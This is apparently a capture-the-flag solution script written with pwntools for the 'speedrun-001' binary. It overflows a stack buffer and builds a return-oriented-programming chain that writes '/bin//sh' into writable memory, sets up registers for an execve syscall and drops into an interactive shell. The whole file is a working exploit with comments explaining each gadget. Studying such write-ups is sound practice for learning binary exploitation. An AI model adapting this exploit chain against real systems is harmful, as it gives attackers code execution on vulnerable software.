from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

bin_name = './speedrun-001'

elf = ELF(bin_name)
io = process(bin_name)
# io = gdb.debug(bin_name,'''
# start
# bp 0x000000000040154a
# c
# ''')

payload = b""
payload += b"a"*0x408

poprax = ROP(elf).find_gadget(["pop rax", "ret"])[0] # available
poprdi = ROP(elf).find_gadget(["pop rdi", "ret"])[0] # available
poprsi = ROP(elf).find_gadget(["pop rsi", "ret"])[0] # available
poprdx = ROP(elf).find_gadget(["pop rdx", "ret"])[0] # available
syscall = ROP(elf).find_gadget(["syscall"])[0] # available

# -----------------------------
# write string "/bin/sh\0" to
# a random space with w permission and full 0 bytes

# ROPgadget --binary ./simplecalc | grep "ret" | grep ": mov qword ptr"
# 0x0000000000418397 : mov qword ptr [rdx], rax ; ret
mov = 0x0000000000418397
binsh = 0x6bca00 # random writable address

# rdx = 0x6bca00
payload += p64(poprdx)
payload += p64(binsh)
# rax = "/bin/sh\0"
payload += p64(poprax)
payload += b"/bin//sh" #
# mov qword ptr [rdx], rax ; ret
payload += p64(mov)
# ------------END--------------

#-------ROP TO SYSCALL---------

# syscall sys_execve
# rax: 59
# rdi: address of command
# rsi: 0
# rdx: 0

#-------------BEGIN------------
# rax = 59
payload += p64(poprax)
payload += p64(59)
# rdi = binsh
payload += p64(poprdi)
payload += p64(binsh)
# rsi = 0
payload += p64(poprsi)
payload += p64(0)
# rdx = 0
payload += p64(poprdx)
payload += p64(0)
# syscall
payload += p64(syscall)
#-------------END--------------

io.sendlineafter(b"Any last words?", payload)

io.interactive()